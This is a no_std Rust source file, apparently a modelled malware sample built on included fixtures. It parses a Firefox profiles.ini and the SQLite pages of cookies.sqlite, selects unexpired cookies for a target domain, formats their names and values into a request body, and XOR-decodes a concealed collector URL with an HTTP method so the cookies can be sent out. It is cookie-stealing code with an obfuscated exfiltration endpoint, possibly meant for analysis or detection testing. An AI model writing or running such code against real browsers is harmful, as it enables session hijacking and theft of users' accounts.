#![no_std]
use core::panic::PanicInfo;
#[panic_handler]
fn panic(_: &PanicInfo) -> ! { loop { core::hint::spin_loop(); } }
include!("fixtures.rs");

#[derive(Clone, Copy)]
struct Text { bytes: [u8; 32], len: usize }
impl Text {
    const fn empty() -> Self { Self { bytes: [0;32], len:0 } }
    fn read(s: &[u8]) -> Option<Self> {
        if s.len()>32 { return None; }
        let mut t=Self::empty(); t.bytes[..s.len()].copy_from_slice(s);t.len=s.len();Some(t)
    }
    fn slice(&self) -> &[u8] { &self.bytes[..self.len] }
}
#[derive(Clone,Copy)]
struct Cookie { domain:Text, name:Text, value:Text, expires:u32 }
impl Cookie { const fn empty()->Self {Self{domain:Text::empty(),name:Text::empty(),value:Text::empty(),expires:0}} }

#[inline(never)]
fn varint(data:&[u8], at:&mut usize)->Option<usize> {
    let mut result=0usize;
    for i in 0..9 {
        let b=*data.get(*at)?;*at+=1;
        result=result.checked_shl(if i==8 {8}else{7})? | usize::from(if i==8 {b}else{b&127});
        if i==8 || b<128 {return Some(result)}
    } None
}
#[inline(never)]
fn parse_cell(page:&[u8], cell:usize)->Option<Cookie> {
    let mut p=cell;
    let payload=varint(page,&mut p)?;let _rowid=varint(page,&mut p)?;
    let start=p;let header=varint(page,&mut p)?;
    if header>payload || start+payload>page.len(){return None}
    let mut kinds=[0usize;4];
    for k in &mut kinds {*k=varint(page,&mut p)?;}
    if p!=start+header {return None}
    let mut texts=[Text::empty();3];
    for i in 0..3 {
        if kinds[i]<13 || kinds[i]%2==0 {return None}
        let n=(kinds[i]-13)/2;
        texts[i]=Text::read(page.get(p..p+n)?)?;p+=n;
    }
    if kinds[3]!=4 {return None}
    let raw=page.get(p..p+4)?;
    let expiry=u32::from_be_bytes([raw[0],raw[1],raw[2],raw[3]]);p+=4;
    if p!=start+payload || expiry>i32::MAX as u32{return None}
    Some(Cookie{domain:texts[0],name:texts[1],value:texts[2],expires:expiry})
}
#[inline(never)]
fn selected_profile()->Option<(usize,Text,bool)> {
    let mut paths=[Text::empty();4];let mut relative=[false;4];
    let mut selected=0usize;let mut current=4usize;let mut is_install=false;
    let mut install=Text::empty();let mut count=0usize;
    for line in PROFILE_INI.split(|b|*b==b'\n') {
        if line.first()==Some(&b'[') {
            is_install=line.starts_with(b"[Install");current=4;
            if line.starts_with(b"[Profile") {if count==4{return None}current=count;count+=1;}
        } else if let Some(pos)=line.iter().position(|b|*b==b'=') {
            let key=&line[..pos];let value=&line[pos+1..];
            if is_install && key==b"Default" {install=Text::read(value)?;}
            else if current<4 {
                if key==b"Path" {paths[current]=Text::read(value)?;}
                else if key==b"IsRelative" {relative[current]=value==b"1";}
                else if key==b"Default" && value==b"1" {selected=current;}
            }
        }
    }
    if install.len>0 {for i in 0..count {if paths[i].slice()==install.slice(){selected=i;break}}}
    if selected>=count{return None}Some((selected,paths[selected],relative[selected]))
}
fn append(dst:&mut [u8], len:&mut usize, data:&[u8])->Option<()> {
    let end=len.checked_add(data.len())?;dst.get_mut(*len..end)?.copy_from_slice(data);*len=end;Some(())
}
fn decimal(value:u32,dst:&mut [u8],len:&mut usize)->Option<()> {
    let mut digits=[0u8;10];let mut n=value;let mut p=10;
    loop {p-=1;digits[p]=b'0'+(n%10)as u8;n/=10;if n==0{break}}
    append(dst,len,&digits[p..])
}
fn store(out:&mut [u64], base:usize, value:&[u8]) {
    out[base]=value.len() as u64;
    for (i,b) in value.iter().enumerate(){out[base+1+i]=u64::from(*b);}
}
#[inline(never)]
fn collector_url(out:&mut [u8])->Option<usize> {
    if COLLECTOR.len()>out.len(){return None}
    let key=unsafe{core::ptr::read_volatile(POLICY.as_ptr().add(4))};
    for i in 0..COLLECTOR.len(){
        let encoded=unsafe{core::ptr::read_volatile(COLLECTOR.as_ptr().add(i))};
        out[i]=encoded ^ key.wrapping_add((i as u8).wrapping_mul(3));
    }
    Some(COLLECTOR.len())
}
#[inline(never)]
fn model(out:&mut [u64])->Option<()> {
    let (profile,path,relative)=selected_profile()?;
    let page=COOKIE_PAGES.get(profile*512..(profile+1)*512)?;
    if page[0]!=13 {return None}
    let now=u32::from_le_bytes([POLICY[0],POLICY[1],POLICY[2],POLICY[3]]);
    let count=u16::from_be_bytes([page[3],page[4]])as usize;
    if count>16{return None}
    let mut selected=[Cookie::empty();2];let mut n=0usize;
    for i in 0..count {
        let p=8+2*i;let offset=u16::from_be_bytes([page[p],page[p+1]])as usize;
        let c=parse_cell(page,offset)?;
        if c.expires<=now || !c.domain.slice().ends_with(&DOMAIN_SUFFIX) {continue}
        let mut slot=n;
        for j in 0..n {if selected[j].domain.slice()==c.domain.slice() && selected[j].name.slice()==c.name.slice(){slot=j;break}}
        if slot==n {if n==selected.len(){return None}n+=1;} selected[slot]=c;
    }
    let mut database=[0u8;120];let mut dlen=0;
    if relative {append(&mut database,&mut dlen,&PROFILE_BASE)?;}
    append(&mut database,&mut dlen,path.slice())?;append(&mut database,&mut dlen,b"/cookies.sqlite")?;
    store(out,0,&database[..dlen]);
    let mut body=[0u8;256];let mut blen=0;
    for i in 0..n {
        let c=selected[i];let base=128+i*128;
        store(out,base,c.domain.slice());store(out,base+32,c.name.slice());store(out,base+64,c.value.slice());out[base+96]=u64::from(c.expires);
        for text in [c.domain,c.name,c.value] {append(&mut body,&mut blen,text.slice())?;append(&mut body,&mut blen,b"\t")?;}
        decimal(c.expires,&mut body,&mut blen)?;append(&mut body,&mut blen,b"\n")?;
    }
    let mut url=[0u8;64];let url_len=collector_url(&mut url)?;
    store(out,384,&HTTP_METHOD);store(out,400,&url[..url_len]);store(out,480,&body[..blen]);out[767]=n as u64;
    Some(())
}
#[no_mangle]
#[inline(never)]
pub unsafe extern "C" fn sample_entry(out:*mut u64)->i32 {
    if out.is_null(){return -1}
    let words=core::slice::from_raw_parts_mut(out,768);words.fill(0);
    if model(words).is_some(){0}else{-2}
}
